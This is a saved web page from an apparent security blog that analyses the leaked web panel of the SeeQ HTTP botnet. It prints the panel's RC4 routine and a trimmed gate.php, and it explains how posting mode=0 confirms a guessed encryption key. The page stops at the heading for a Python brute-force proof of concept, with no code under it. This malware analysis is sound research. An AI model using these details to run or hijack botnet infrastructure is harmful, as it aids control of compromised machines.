<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US"><!--<![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Brute forcing SeeQ http botnet encryption | TomsonSec</title>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok2v=1613a3a185/"},atok:"c2f92801b93be329f53894911606aec8",petok:"df24bfd8ad37a52de8ca610a40bc9cad6c3a5e47-1419606295-1800",zone:"tomsonsec.com",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok2v=919620257c/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script><script type="text/javascript" src="Brute%20forcing%20SeeQ%20http%20botnet%20encryption%20%7C%20TomsonSec_files/cloudflare.js"></script><style type="text/css">.cf-hidden { display: none; } .cf-invisible { visibility: hidden; }</style><script data-module="cloudflare/rocket" id="cfjs_block_13752adc5ed" onload="CloudFlare.__cfjs_block_13752adc5ed_load()" onerror="CloudFlare.__cfjs_block_13752adc5ed_error()" onreadystatechange="CloudFlare.__cfjs_block_13752adc5ed_readystatechange()" type="text/javascript" src="Brute%20forcing%20SeeQ%20http%20botnet%20encryption%20%7C%20TomsonSec_files/rocket.js"></script>
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="http://tomsonsec.com/xmlrpc.php">
<!--[if lt IE 9]>
<script src="http://tomsonsec.com/wp-content/themes/twentytwelve/js/html5.js" type="text/javascript"></script>
<![endif]-->
<link rel="alternate" type="application/rss+xml" title="TomsonSec » Feed" href="http://tomsonsec.com/index.php/feed/">
<link rel="alternate" type="application/rss+xml" title="TomsonSec » Comments Feed" href="http://tomsonsec.com/index.php/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="TomsonSec » Brute forcing SeeQ http botnet encryption Comments Feed" href="http://tomsonsec.com/index.php/brute-forcing-seeq-http-botnet-encryption/feed/">
<link rel="stylesheet" id="twentytwelve-fonts-css" href="Brute%20forcing%20SeeQ%20http%20botnet%20encryption%20%7C%20TomsonSec_files/css.css" type="text/css" media="all">
<link rel="stylesheet" id="twentytwelve-style-css" href="Brute%20forcing%20SeeQ%20http%20botnet%20encryption%20%7C%20TomsonSec_files/A.css" type="text/css" media="all">
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentytwelve-ie-css'  href='http://tomsonsec.com/wp-content/themes/twentytwelve/css/ie.css?ver=20121010' type='text/css' media='all' />
<![endif]-->
<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://tomsonsec.com/wp-includes/js/jquery/jquery.js,qver=1.11.1.pagespeed.jm.z9hb-Gxqf6.js"></script>
<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://tomsonsec.com/wp-includes/js/jquery/jquery-migrate.min.js,qver=1.2.1.pagespeed.jm.mhpNjdU8Wl.js"></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://tomsonsec.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://tomsonsec.com/wp-includes/wlwmanifest.xml">
<link rel="prev" title="Smart zip extraction in python" href="http://tomsonsec.com/index.php/smart-zip-extraction-in-python/">
<link rel="next" title="PBBoard " href="http://tomsonsec.com/index.php/pbboard/">
<meta name="generator" content="WordPress 4.1">
<link rel="canonical" href="http://tomsonsec.com/index.php/brute-forcing-seeq-http-botnet-encryption/">
<link rel="shortlink" href="http://tomsonsec.com/?p=255">
 
<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shCore.js.pagespeed.jm.ErSeI76fhQ.js"></script>
<script data-rocketoptimized="true" type="text/rocketscript">//<![CDATA[
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(2(){1 h=5;h.I=2(){2 n(c,a){4(1 d=0;d<c.9;d++)i[c[d]]=a}2 o(c){1 a=r.H("J"),d=3;a.K=c;a.M="L/t";a.G="t";a.u=a.v=2(){6(!d&&(!8.7||8.7=="F"||8.7=="z")){d=q;e[c]=q;a:{4(1 p y e)6(e[p]==3)B a;j&&5.C(k)}a.u=a.v=x;a.D.O(a)}};r.N.R(a)}1 f=Q,l=h.P(),i={},e={},j=3,k=x,b;5.T=2(c){k=c;j=q};4(b=0;b<f.9;b++){1 m=f[b].w?f[b]:f[b].S(/\\s+/),g=m.w();n(m,g)}4(b=0;b<l.9;b++)6(g=i[l[b].E.A]){e[g]=3;o(g)}}})();',56,56,'|var|function|false|for|SyntaxHighlighter|if|readyState|this|length|||||||||||||||||true|document||javascript|onload|onreadystatechange|pop|null|in|complete|brush|break|highlight|parentNode|params|loaded|language|createElement|autoloader|script|src|text|type|body|removeChild|findElements|arguments|appendChild|split|all'.split('|'),0,{}))
//]]></script>
<link type="text/css" rel="stylesheet" href="Brute%20forcing%20SeeQ%20http%20botnet%20encryption%20%7C%20TomsonSec_files/A_002.css">
 
<style type="text/css" id="custom-background-css">body.custom-background{background-color:#fff;background-image:url(http://tomsonsec.com/wp-content/uploads/2013/11/tweed_,402X.png.pagespeed.ce.ovGQxspg7h.png);background-repeat:repeat;background-position:top left;background-attachment:fixed}</style>
</head>
<body class="single single-post postid-255 single-format-standard custom-background full-width custom-font-enabled single-author">
<div id="page" class="hfeed site">
<header id="masthead" class="site-header" role="banner">
<hgroup>
<h1 class="site-title"><a href="http://tomsonsec.com/" title="TomsonSec" rel="home">TomsonSec</a></h1>
<h2 class="site-description">Computer security and more</h2>
</hgroup>
<nav id="site-navigation" class="main-navigation" role="navigation">
<h3 class="menu-toggle">Menu</h3>
<a class="assistive-text" href="#content" title="Skip to content">Skip to content</a>
<div class="nav-menu"><ul><li><a href="http://tomsonsec.com/">Home</a></li><li class="page_item page-item-54"><a href="http://tomsonsec.com/index.php/54-2/">About</a></li><li class="page_item page-item-377"><a href="http://tomsonsec.com/index.php/practical-reverse-engineering/">Practical Reverse Engineering – solutions</a></li></ul></div>
</nav> 
</header> 
<div id="main" class="wrapper">
<div id="primary" class="site-content">
<div id="content" role="main">
<article id="post-255" class="post-255 post type-post status-publish format-standard hentry category-botnet category-php category-security tag-bot tag-botnet tag-encryption tag-http tag-seeq">
<header class="entry-header">
<h1 class="entry-title">Brute forcing SeeQ http botnet encryption</h1>
<div class="comments-link">
<a href="http://tomsonsec.com/index.php/brute-forcing-seeq-http-botnet-encryption/#respond" title="Comment on Brute forcing SeeQ http botnet encryption"><span class="leave-reply">Leave a reply</span></a> </div> 
</header> 
<div class="entry-content">
<p>A friend and I analysed the web panel of a http botnet named Seeq which have been leaked.</p>
<p>It’s a decently coded panel with an author who at least are no beginner in php.</p>
<p>The bot’s features are:</p>
<ul>
<li>HTTP flood</li>
<li>Syn flood</li>
<li>UDP flood</li>
<li>Download and execute</li>
<li>Visit page</li>
<li>Update core</li>
</ul>
<p>The bot make use of the rc4 encryption ( same as WEP use). The &nbsp;function, inside base.class.php:</p>
<div><div id="highlighter_280106" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php keyword">public</code> <code class="php keyword">function</code> <code class="php plain">RC4(</code><code class="php variable">$Data</code><code class="php plain">, </code><code class="php variable">$Key</code><code class="php plain">) {</code></div><div class="line number2 index1 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bS</code> <code class="php plain">= </code><code class="php keyword">array</code><code class="php plain">();</code></div><div class="line number3 index2 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$a</code> <code class="php plain">= </code><code class="php variable">$b</code> <code class="php plain">= 0;</code></div><div class="line number4 index3 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bSwap</code> <code class="php plain">= </code><code class="php variable">$nData</code> <code class="php plain">= NULL;</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">for</code> <code class="php plain">(</code><code class="php variable">$a</code> <code class="php plain">= 0; </code><code class="php variable">$a</code> <code class="php plain">&lt; 256; </code><code class="php variable">$a</code><code class="php plain">++) {</code></div><div class="line number7 index6 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$a</code><code class="php plain">] = </code><code class="php variable">$a</code><code class="php plain">;</code></div><div class="line number8 index7 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">for</code> <code class="php plain">(</code><code class="php variable">$a</code> <code class="php plain">= 0; </code><code class="php variable">$a</code> <code class="php plain">&lt; 256; </code><code class="php variable">$a</code><code class="php plain">++) {</code></div><div class="line number11 index10 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$b</code> <code class="php plain">= (</code><code class="php variable">$b</code> <code class="php plain">+ </code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$a</code><code class="php plain">] + ord(</code><code class="php variable">$Key</code><code class="php plain">[</code><code class="php variable">$a</code> <code class="php plain">% </code><code class="php functions">strlen</code><code class="php plain">(</code><code class="php variable">$Key</code><code class="php plain">)])) % 256;</code></div><div class="line number12 index11 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bSwap</code> <code class="php plain">= </code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$a</code><code class="php plain">];</code></div><div class="line number13 index12 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$a</code><code class="php plain">] = </code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$b</code><code class="php plain">];</code></div><div class="line number14 index13 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$b</code><code class="php plain">] = </code><code class="php variable">$bSwap</code><code class="php plain">;</code></div><div class="line number15 index14 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$a</code> <code class="php plain">= </code><code class="php variable">$b</code> <code class="php plain">= 0;</code></div><div class="line number18 index17 alt1">&nbsp;</div><div class="line number19 index18 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">for</code> <code class="php plain">(</code><code class="php variable">$dwCount</code> <code class="php plain">= 0; </code><code class="php variable">$dwCount</code> <code class="php plain">&lt; </code><code class="php functions">strlen</code><code class="php plain">(</code><code class="php variable">$Data</code><code class="php plain">); </code><code class="php variable">$dwCount</code><code class="php plain">++) {</code></div><div class="line number20 index19 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$a</code> <code class="php plain">= (</code><code class="php variable">$a</code> <code class="php plain">+ 1) % 256;</code></div><div class="line number21 index20 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$b</code> <code class="php plain">= (</code><code class="php variable">$b</code> <code class="php plain">+ </code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$a</code><code class="php plain">]) % 256;</code></div><div class="line number22 index21 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bSwap</code> <code class="php plain">= </code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$a</code><code class="php plain">];</code></div><div class="line number23 index22 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$a</code><code class="php plain">] = </code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$b</code><code class="php plain">];</code></div><div class="line number24 index23 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$b</code><code class="php plain">] = </code><code class="php variable">$bSwap</code><code class="php plain">;</code></div><div class="line number25 index24 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$nData</code> <code class="php plain">.= </code><code class="php variable">$Data</code><code class="php plain">[</code><code class="php variable">$dwCount</code><code class="php plain">] ^ </code><code class="php functions">chr</code><code class="php plain">(</code><code class="php variable">$bS</code><code class="php plain">[(</code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$a</code><code class="php plain">] + </code><code class="php variable">$bS</code><code class="php plain">[</code><code class="php variable">$b</code><code class="php plain">]) % 256]);</code></div><div class="line number26 index25 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number27 index26 alt2">&nbsp;</div><div class="line number28 index27 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php variable">$nData</code><code class="php plain">;</code></div><div class="line number29 index28 alt2"><code class="php plain">}</code></div></div></td></tr></tbody></table></div></div>
<p>It’s the file gate.php the bots contacts, both for registering and 
receiving commands. But as I and my fellow teammate discovered there are
 no vulnerabilities besides brute forcing the encryption key, thats the 
only part I will talk about.</p>
<p>The gate.php with all trash not regarding the encryption removed:</p>
<div><div id="highlighter_519809" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php keyword">if</code> <code class="php plain">(@</code><code class="php variable">$_SERVER</code><code class="php plain">[</code><code class="php string">'REQUEST_METHOD'</code><code class="php plain">] !== </code><code class="php string">'POST'</code><code class="php plain">) {</code></div><div class="line number2 index1 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">die</code><code class="php plain">();</code></div><div class="line number3 index2 alt2"><code class="php plain">}</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2"><code class="php keyword">require_once</code><code class="php plain">(</code><code class="php string">'system/global.php'</code><code class="php plain">);</code></div><div class="line number6 index5 alt1"><code class="php keyword">include_once</code><code class="php plain">(</code><code class="php string">'system/geoip/geoip.inc'</code><code class="php plain">);</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="php variable">$Data</code> <code class="php plain">= @</code><code class="php functions">file_get_contents</code><code class="php plain">(</code><code class="php string">'<a href="php://input">php://input</a>'</code><code class="php plain">); // Reads post data.</code></div><div class="line number9 index8 alt2"><code class="php variable">$Data</code> <code class="php plain">= </code><code class="php variable">$Base</code><code class="php plain">-&gt;RC4(</code><code class="php variable">$Data</code><code class="php plain">, ST_ENC_KEY); </code><code class="php comments">// Decrypts the given post value,</code></div><div class="line number10 index9 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php comments">// returns a string.</code></div><div class="line number11 index10 alt2"><code class="php functions">parse_str</code><code class="php plain">(</code><code class="php variable">$Data</code><code class="php plain">, </code><code class="php variable">$Data</code><code class="php plain">); </code><code class="php comments">// Parses the (possibly) decrypted string into</code></div><div class="line number12 index11 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php comments">// an array.</code></div><div class="line number13 index12 alt2">&nbsp;</div><div class="line number14 index13 alt1"><code class="php keyword">if</code> <code class="php plain">(</code><code class="php functions">empty</code><code class="php plain">(</code><code class="php variable">$Data</code><code class="php plain">[</code><code class="php string">'hwid'</code><code class="php plain">])) {</code><code class="php comments">// If hwid is empty, die, so everyone with</code></div><div class="line number15 index14 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">die</code><code class="php plain">();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="php comments">// a post value incorrect encrypted will be</code></div><div class="line number16 index15 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php comments">// stopped here.</code></div><div class="line number17 index16 alt2"><code class="php plain">}</code></div><div class="line number18 index17 alt1"><code class="php keyword">if</code> <code class="php plain">(!isset(</code><code class="php variable">$Data</code><code class="php plain">[</code><code class="php string">'rate'</code><code class="php plain">])) {</code></div><div class="line number19 index18 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$Data</code><code class="php plain">[</code><code class="php string">'rate'</code><code class="php plain">] = -1;</code></div><div class="line number20 index19 alt1"><code class="php plain">}</code></div><div class="line number21 index20 alt2"><code class="php variable">$Data</code><code class="php plain">[</code><code class="php string">'time'</code><code class="php plain">] = time();</code></div><div class="line number22 index21 alt1"><code class="php keyword">switch</code> <code class="php plain">(</code><code class="php variable">$Data</code><code class="php plain">[</code><code class="php string">'mode'</code><code class="php plain">]) {</code><code class="php comments">// Mode is set by post value</code></div><div class="line number23 index22 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">case</code> <code class="php plain">0: {</code></div><div class="line number24 index23 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(</code><code class="php functions">empty</code><code class="php plain">(</code><code class="php variable">$Data</code><code class="php plain">[</code><code class="php string">'system'</code><code class="php plain">])) {</code></div><div class="line number25 index24 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">die</code><code class="php plain">();</code></div><div class="line number26 index25 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number27 index26 alt2">&nbsp;</div><div class="line number28 index27 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(!isset(</code><code class="php variable">$Data</code><code class="php plain">[</code><code class="php string">'socks5'</code><code class="php plain">])) {</code></div><div class="line number29 index28 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">die</code><code class="php plain">();</code></div><div class="line number30 index29 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number31 index30 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">SendReply(ST_ENC_KEY); </code><code class="php comments">// Sends the key encrypted with itself as</code></div><div class="line number32 index31 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php comments">// a way for the bot to control if it really</code></div><div class="line number33 index32 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php comments">// is an answer from the correct server.</code></div><div class="line number34 index33 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">} </code><code class="php keyword">break</code><code class="php plain">;</code></div><div class="line number35 index34 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">case</code> <code class="php plain">1: { </code><code class="php comments">//Sends possible commands.</code></div><div class="line number36 index35 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(</code><code class="php variable">$DB</code><code class="php plain">-&gt;NumRows(</code><code class="php variable">$Query</code><code class="php plain">) &gt; 0) {</code></div><div class="line number37 index36 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$rCommand</code> <code class="php plain">= </code><code class="php variable">$Task</code><code class="php plain">[</code><code class="php string">'command'</code><code class="php plain">];</code></div><div class="line number38 index37 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">SendReply(</code><code class="php variable">$rCommand</code><code class="php plain">);</code></div><div class="line number39 index38 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">} </code><code class="php keyword">else</code> <code class="php plain">{</code></div><div class="line number40 index39 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">SendReply(</code><code class="php string">'ERROR'</code><code class="php plain">);</code></div><div class="line number41 index40 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number42 index41 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">} </code><code class="php keyword">break</code><code class="php plain">;</code></div><div class="line number43 index42 alt2"><code class="php plain">}</code></div><div class="line number44 index43 alt1">&nbsp;</div><div class="line number45 index44 alt2"><code class="php keyword">function</code> <code class="php plain">SendReply(</code><code class="php variable">$Data</code><code class="php plain">) {</code></div><div class="line number46 index45 alt1">&nbsp;</div><div class="line number47 index46 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">global</code> <code class="php variable">$Base</code><code class="php plain">;</code></div><div class="line number48 index47 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">die</code><code class="php plain">(</code><code class="php variable">$Base</code><code class="php plain">-&gt;RC4(</code><code class="php variable">$Data</code><code class="php plain">, ST_ENC_KEY));</code></div><div class="line number49 index48 alt2"><code class="php plain">}</code></div></div></td></tr></tbody></table></div></div>
<p>So basically what we see is that if we guess the correct encryption 
key it’s quite easy to control if it’s the correct one only by setting 
the post value mode to 0 and fill up the other ones with some trash.</p>
<p>A POC in python with a dictionary bruteforcer:</p>
